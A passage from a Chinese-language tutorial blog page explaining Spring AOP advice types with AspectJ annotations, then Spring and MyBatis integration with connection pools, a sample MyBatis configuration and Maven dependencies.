com.bjpowernode.ba01.SomeServiceImpl.doSome(String,Integer))&quot;)</span></span><br><span class="line"><span class="comment">    public void myBefore()&#123;</span></span><br><span class="line"><span class="comment">        //就是你切面要执行的功能代码</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;前置通知， 切面功能：在目标方法之前输出执行时间：&quot;+ new Date());</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*@Before(value = &quot;execution(void com.bjpowernode.ba01.SomeServiceImpl.doSome(String,Integer))&quot;)</span></span><br><span class="line"><span class="comment">    public void myBefore()&#123;</span></span><br><span class="line"><span class="comment">        //就是你切面要执行的功能代码</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;1=====前置通知， 切面功能：在目标方法之前输出执行时间：&quot;+ new Date());</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  @Before(value = &quot;execution(void *..SomeServiceImpl.doSome(String,Integer))&quot;)</span></span><br><span class="line"><span class="comment">    public void myBefore()&#123;</span></span><br><span class="line"><span class="comment">        //就是你切面要执行的功能代码</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;2=====前置通知， 切面功能：在目标方法之前输出执行时间：&quot;+ new Date());</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*@Before(value = &quot;execution(* *..SomeServiceImpl.*(..))&quot;)</span></span><br><span class="line"><span class="comment">    public void myBefore()&#123;</span></span><br><span class="line"><span class="comment">        //就是你切面要执行的功能代码</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;3=====前置通知， 切面功能：在目标方法之前输出执行时间：&quot;+ new Date());</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*@Before(value = &quot;execution(* do*(..))&quot;)</span></span><br><span class="line"><span class="comment">    public void myBefore2()&#123;</span></span><br><span class="line"><span class="comment">        //就是你切面要执行的功能代码</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;4=====前置通知， 切面功能：在目标方法之前输出执行时间：&quot;+ new Date());</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*@Before(value = &quot;execution(* com.bjpowernode.ba01.*ServiceImpl.*(..))&quot;)</span></span><br><span class="line"><span class="comment">    public void myBefore2()&#123;</span></span><br><span class="line"><span class="comment">        //就是你切面要执行的功能代码</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;2=====前置通知， 切面功能：在目标方法之前输出执行时间：&quot;+ new Date());</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定通知方法中的参数 ： JoinPoint</span></span><br><span class="line"><span class="comment">     * JoinPoint:业务方法，要加入切面功能的业务方法</span></span><br><span class="line"><span class="comment">     *    作用是：可以在通知方法中获取方法执行时的信息， 例如方法名称，方法的实参。</span></span><br><span class="line"><span class="comment">     *    如果你的切面功能中需要用到方法的信息，就加入JoinPoint.</span></span><br><span class="line"><span class="comment">     *    这个JoinPoint参数的值是由框架赋予， 必须是第一个位置的参数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Before(value = &quot;execution(void *..SomeServiceImpl.doSome(String,Integer))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myBefore</span><span class="params">(JoinPoint jp)</span>&#123;</span><br><span class="line">        <span class="comment">//获取方法的完整定义</span></span><br><span class="line">        System.out.println(<span class="string">&quot;方法的签名（定义）=&quot;</span>+jp.getSignature());</span><br><span class="line">        System.out.println(<span class="string">&quot;方法的名称=&quot;</span>+jp.getSignature().getName());</span><br><span class="line">        <span class="comment">//获取方法的实参</span></span><br><span class="line">        Object args [] = jp.getArgs();</span><br><span class="line">        <span class="keyword">for</span> (Object arg:args)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;参数=&quot;</span>+arg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//就是你切面要执行的功能代码</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2=====前置通知， 切面功能：在目标方法之前输出执行时间：&quot;</span>+ <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@AfterReturning</span>:后置通知</span></span><br><span class="line"><span class="comment">     *    属性：1.value 切入点表达式</span></span><br><span class="line"><span class="comment">     *         2.returning 自定义的变量，表示目标方法的返回值的。</span></span><br><span class="line"><span class="comment">     *          自定义变量名必须和通知方法的形参名一样。</span></span><br><span class="line"><span class="comment">     *    位置：在方法定义的上面</span></span><br><span class="line"><span class="comment">     * 特点：</span></span><br><span class="line"><span class="comment">     *  1. 在目标方法之后执行的。</span></span><br><span class="line"><span class="comment">     *  2. 能够获取到目标方法的返回值，可以根据这个返回值做不同的处理功能</span></span><br><span class="line"><span class="comment">     *      Object res = doOther();</span></span><br><span class="line"><span class="comment">     *  3. 可以修改这个返回值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  后置通知的执行</span></span><br><span class="line"><span class="comment">     *    Object res = doOther();</span></span><br><span class="line"><span class="comment">     *    参数传递： 传值， 传引用</span></span><br><span class="line"><span class="comment">     *    myAfterReturing(res);</span></span><br><span class="line"><span class="comment">     *    System.out.println(&quot;res=&quot;+res)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterReturning(value = &quot;execution(* *..SomeServiceImpl.doOther(..))&quot;,</span></span><br><span class="line"><span class="meta">                    returning = &quot;res&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myAfterReturing</span><span class="params">(  JoinPoint jp  ,Object res )</span>&#123;</span><br><span class="line">        <span class="comment">// Object res:是目标方法执行后的返回值，根据返回值做你的切面的功能处理</span></span><br><span class="line">        System.out.println(<span class="string">&quot;后置通知：方法的定义&quot;</span>+ jp.getSignature());</span><br><span class="line">        System.out.println(<span class="string">&quot;后置通知：在目标方法之后执行的，获取的返回值是：&quot;</span>+res);</span><br><span class="line">        <span class="keyword">if</span>(res.equals(<span class="string">&quot;abcd&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//做一些功能</span></span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//做其它功能</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改目标方法的返回值， 看一下是否会影响 最后的方法调用结果</span></span><br><span class="line">        <span class="keyword">if</span>( res != <span class="literal">null</span>)&#123;</span><br><span class="line">            res = <span class="string">&quot;Hello Aspectj&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Around</span>: 环绕通知</span></span><br><span class="line"><span class="comment">     *    属性：value 切入点表达式</span></span><br><span class="line"><span class="comment">     *    位置：在方法的定义什么</span></span><br><span class="line"><span class="comment">     * 特点：</span></span><br><span class="line"><span class="comment">     *   1.它是功能最强的通知</span></span><br><span class="line"><span class="comment">     *   2.在目标方法的前和后都能增强功能。</span></span><br><span class="line"><span class="comment">     *   3.控制目标方法是否被调用执行</span></span><br><span class="line"><span class="comment">     *   4.修改原来的目标方法的执行结果。 影响最后的调用结果</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  环绕通知，等同于jdk动态代理的，InvocationHandler接口</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  参数：  ProceedingJoinPoint 就等同于 Method</span></span><br><span class="line"><span class="comment">     *         作用：执行目标方法的</span></span><br><span class="line"><span class="comment">     *  返回值： 就是目标方法的执行结果，可以被修改。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  环绕通知： 经常做事务， 在目标方法之前开启事务，执行目标方法， 在目标方法之后提交事务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Around(value = &quot;execution(* *..SomeServiceImpl.doFirst(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">myAround</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//获取第一个参数值</span></span><br><span class="line">        Object args [] = pjp.getArgs();</span><br><span class="line">        <span class="keyword">if</span>( args!= <span class="literal">null</span> &amp;&amp; args.length &gt; <span class="number">1</span>)&#123;</span><br><span class="line">              Object arg=  args[<span class="number">0</span>];</span><br><span class="line">              name =(String)arg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实现环绕通知</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;环绕通知：在目标方法之前，输出时间：&quot;</span>+ <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        <span class="comment">//1.目标方法调用</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="string">&quot;zhangsan&quot;</span>.equals(name))&#123;</span><br><span class="line">            <span class="comment">//符合条件，调用目标方法</span></span><br><span class="line">            result = pjp.proceed(); <span class="comment">//method.invoke(); Object result = doFirst();</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;环绕通知：在目标方法之后，提交事务&quot;</span>);</span><br><span class="line">        <span class="comment">//2.在目标方法的前或者后加入功能</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改目标方法的执行结果， 影响方法最后的调用结果</span></span><br><span class="line">        <span class="keyword">if</span>( result != <span class="literal">null</span>)&#123;</span><br><span class="line">              result = <span class="string">&quot;Hello AspectJ AOP&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回目标方法的执行结果</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@AfterThrowing</span>:异常通知</span></span><br><span class="line"><span class="comment">     *     属性：1. value 切入点表达式</span></span><br><span class="line"><span class="comment">     *          2. throwinng 自定义的变量，表示目标方法抛出的异常对象。</span></span><br><span class="line"><span class="comment">     *             变量名必须和方法的参数名一样</span></span><br><span class="line"><span class="comment">     * 特点：</span></span><br><span class="line"><span class="comment">     *   1. 在目标方法抛出异常时执行的</span></span><br><span class="line"><span class="comment">     *   2. 可以做异常的监控程序， 监控目标方法执行时是不是有异常。</span></span><br><span class="line"><span class="comment">     *      如果有异常，可以发送邮件，短信进行通知</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  执行就是：</span></span><br><span class="line"><span class="comment">     *   try&#123;</span></span><br><span class="line"><span class="comment">     *       SomeServiceImpl.doSecond(..)</span></span><br><span class="line"><span class="comment">     *   &#125;catch(Exception e)&#123;</span></span><br><span class="line"><span class="comment">     *       myAfterThrowing(e);</span></span><br><span class="line"><span class="comment">     *   &#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterThrowing(value = &quot;execution(* *..SomeServiceImpl.doSecond(..))&quot;,</span></span><br><span class="line"><span class="meta">            throwing = &quot;ex&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myAfterThrowing</span><span class="params">(Exception ex)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;异常通知：方法发生异常时，执行：&quot;</span>+ex.getMessage());</span><br><span class="line">        <span class="comment">//发送邮件，短信，通知开发人员</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@After</span> :最终通知</span></span><br><span class="line"><span class="comment">     *    属性： value 切入点表达式</span></span><br><span class="line"><span class="comment">     *    位置： 在方法的上面</span></span><br><span class="line"><span class="comment">     * 特点：</span></span><br><span class="line"><span class="comment">     *  1.总是会执行</span></span><br><span class="line"><span class="comment">     *  2.在目标方法之后执行的</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  try&#123;</span></span><br><span class="line"><span class="comment">     *      SomeServiceImpl.doThird(..)</span></span><br><span class="line"><span class="comment">     *  &#125;catch(Exception e)&#123;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  &#125;finally&#123;</span></span><br><span class="line"><span class="comment">     *      myAfter()</span></span><br><span class="line"><span class="comment">     *  &#125;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@After(value = &quot;execution(* *..SomeServiceImpl.doThird(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span>  <span class="title function_">myAfter</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行最终通知，总是会被执行的代码&quot;</span>);</span><br><span class="line">        <span class="comment">//一般做资源清除工作的。</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Pointcut</span>: 定义和管理切入点， 如果你的项目中有多个切入点表达式是重复的，可以复用的。可以使用<span class="doctag">@Pointcut</span></span></span><br><span class="line"><span class="comment">     *    属性：value 切入点表达式</span></span><br><span class="line"><span class="comment">     *    位置：在自定义的方法上面</span></span><br><span class="line"><span class="comment">     * 特点：</span></span><br><span class="line"><span class="comment">     *   当使用<span class="doctag">@Pointcut</span>定义在一个方法的上面 ，此时这个方法的名称就是切入点表达式的别名。</span></span><br><span class="line"><span class="comment">     *   其它的通知中，value属性就可以使用这个方法名称，代替切入点表达式了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Pointcut(value = &quot;execution(* *..SomeServiceImpl.doThird(..))&quot; )</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">mypt</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//无需代码，</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>xml文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--把对象交给spring容器，由spring容器统一创建，管理对象--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--声明目标对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;someService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.bjpowernode.ba08.SomeServiceImpl&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明切面类对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myAspect&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.bjpowernode.ba08.MyAspect&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明自动代理生成器：使用aspectj框架内部的功能，创建目标对象的代理对象。</span></span><br><span class="line"><span class="comment">    创建代理对象是在内存中实现的， 修改目标对象的内存中的结构。 创建为代理对象</span></span><br><span class="line"><span class="comment">    所以目标对象就是被修改后的代理对象.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    aspectj-autoproxy:会把spring容器中的所有的目标对象，一次性都生成代理对象。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;aop:aspectj-autoproxy /&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   如果你期望目标类有接口，使用cglib代理</span></span><br><span class="line"><span class="comment">   proxy-target-class=&quot;true&quot;:告诉框架，要使用cglib动态代理</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span> <span class="attr">proxy-target-class</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Spring-Mybatis"><a href="#Spring-Mybatis" class="headerlink" title="Spring+Mybatis"></a>Spring+Mybatis</h3><p>用的技术是：ioc 。<br>为什么ioc：能把mybatis和spring集成在一起，像一个框架， 是因为ioc能创建对象。<br> 可以把mybatis框架中的对象交给spring统一创建， 开发人员从spring中获取对象。<br> 开发人员就不用同时面对两个或多个框架了， 就面对一个spring</p><p>mybatis使用步骤，对象<br>1.定义dao接口 ，StudentDao<br>2.定义mapper文件 StudentDao.xml<br>3.定义mybatis的主配置文件 mybatis.xml<br>4.创建dao的代理对象， StudentDao dao &#x3D; SqlSession.getMapper(StudentDao.class);</p><p>   List<Student> students  &#x3D; dao.selectStudents();</p><p>要使用dao对象，需要使用getMapper()方法，<br>怎么能使用getMapper()方法，需要哪些条件<br>1.获取SqlSession对象， 需要使用SqlSessionFactory的openSession()方法。<br>2.创建SqlSessionFactory对象。 通过读取mybatis的主配置文件，能创建SqlSessionFactory对象</p><p>需要SqlSessionFactory对象， 使用Factory能获取SqlSession ，有了SqlSession就能有dao ， 目的就是获取dao对象<br>Factory创建需要读取主配置文件</p><p>我们会使用独立的连接池类替换mybatis默认自己带的， 把连接池类也交给spring创建。</p><p>主配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 1.数据库信息</span><br><span class="line"> <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;mydev&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--数据库的驱动类名--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--连接数据库的url字符串--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/springdb&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--访问数据库的用户名--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--密码--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">2. mapper文件的位置</span><br><span class="line">   <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/bjpowernode/dao/StudentDao.xml&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;mapper resource=&quot;com/bjpowernode/dao/SchoolDao.xml&quot; /&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上的说明，我们需要让spring创建以下对象<br>1.独立的连接池类的对象， 使用阿里的druid连接池<br>2.SqlSessionFactory对象<br>3.创建出dao对象</p><p>需要学习就是上面三个对象的创建语法，使用xml的bean标签。</p><p>连接池：多个连接Connection对象的集合， List<Connection>  connlist : connList就是连接池</p><p>通常使用Connection访问数据库<br>Connection conn &#x3D;DriverManger.getConnection(url,username,password);<br>Statemenet stmt &#x3D; conn.createStatement(sql);<br>stmt.executeQuery();<br>conn.close();</p><p>使用连接池<br>在程序启动的时候，先创建一些Connection<br>Connection c1 &#x3D; …<br>Connection c2 &#x3D; …<br>Connection c3 &#x3D; …<br>List<Connection>  connlist &#x3D; new ArrayLits();<br>connList.add(c1);<br>connList.add(c2);<br>connList.add(c3);</p><p>Connection conn &#x3D; connList.get(0);<br>Statemenet stmt &#x3D; conn.createStatement(sql);<br>stmt.executeQuery();<br>把使用过的connection放回到连接池<br>connList.add(conn);</p><p>Connection conn1 &#x3D; connList.get(1);<br>Statemenet stmt &#x3D; conn1.createStatement(sql);<br>stmt.executeQuery();<br>把使用过的connection放回到连接池<br>connList.add(conn1);</p><p>加入依赖项</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring核心ioc--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--做spring事务用到的--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--mybatis依赖--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--mybatis和spring集成的依赖--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--mysql驱动--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--阿里公司的数据库连接池--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--目的是把src/main/java目录中的xml文件包含到输出结果中。输出到classes目录中--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span><span class="comment">&lt;!--所在的目录--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span><span class="comment">&lt;!--包括目录下的.properties,.xml 文件都会扫描到--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span 